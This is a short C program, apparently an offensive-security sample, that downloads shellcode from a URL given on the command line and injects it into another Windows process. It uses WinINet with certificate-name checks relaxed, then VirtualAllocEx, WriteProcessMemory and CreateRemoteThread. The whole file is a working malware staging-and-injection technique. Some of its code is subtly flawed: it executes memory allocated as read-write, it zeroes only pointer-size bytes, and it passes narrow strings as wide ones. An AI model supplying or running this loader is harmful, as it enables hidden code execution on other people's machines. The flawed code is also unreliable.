/*
Shellcode injection in remote process using wininet.h api to stage the payload
*/

#include <windows.h>
#include <stdio.h>
#include <wininet.h>


int get_http_payload(LPCWSTR url_string,PVOID pBuffer, size_t sPayloadSize){

    HINTERNET hInternet = NULL;
    HINTERNET hUrlOpener = NULL;
    DWORD ReadBytes = 0;

    hInternet = InternetOpenW(NULL,NULL,NULL,NULL,NULL);

    if (!hInternet){
        printf("[!Error] while trying to get a handle with InternetOpenW \t :%ld",GetLastError());
        return -1;
    }

    hUrlOpener = InternetOpenUrlW(hInternet,url_string,
    NULL,NULL,INTERNET_FLAG_HYPERLINK|INTERNET_FLAG_IGNORE_CERT_CN_INVALID,
    NULL);

    if (!hUrlOpener){
        printf("[!]Error while trying to get a handle with InternetOpenUrlW\t : %ld",GetLastError());
        return -1;
    }

    if (!InternetReadFile(hUrlOpener,pBuffer,sPayloadSize,&ReadBytes)||ReadBytes!=sPayloadSize){
        printf("[!]Error while reading from the remote URL");
        return -1;
    }

    InternetCloseHandle(hInternet);
    InternetCloseHandle(hUrlOpener);
    InternetSetOptionW(NULL,INTERNET_OPTION_SETTINGS_CHANGED,NULL,0);

    return 0;
}


int main(int argc, char* argv[]){

    
    size_t sPayloadSize = NULL;
    DWORD BytesWriten = 0;

    if (argc < 4){
        printf("[!]Usage %s <url> <payload Size> <inject_pid> \n",argv[0]);
        return -1;    
    }

    LPCWSTR url_string = argv[1];
    sPayloadSize = atoi(argv[2]);
    DWORD pid = atoi(argv[3]);

    PVOID pBuffer = HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,sPayloadSize);

    get_http_payload(url_string,pBuffer,sPayloadSize);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);

    LPVOID pRemoteBuffer = VirtualAllocEx(hProcess,NULL,sPayloadSize,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);

    WriteProcessMemory(hProcess,pRemoteBuffer,pBuffer,sPayloadSize,&BytesWriten);

    memset(pBuffer,'\0',sizeof(pBuffer));

    HANDLE hThread = CreateRemoteThread(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)pRemoteBuffer,NULL,NULL,NULL);

    WaitForSingleObject(hThread,INFINITE);


    return 0;
}